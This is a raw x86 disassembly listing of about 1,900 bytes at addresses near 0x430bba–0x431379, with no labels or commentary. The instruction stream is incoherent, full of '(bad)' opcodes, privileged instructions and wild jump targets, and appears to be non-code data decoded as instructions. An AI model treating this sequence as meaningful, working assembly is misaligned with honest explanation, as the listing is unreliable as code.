  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
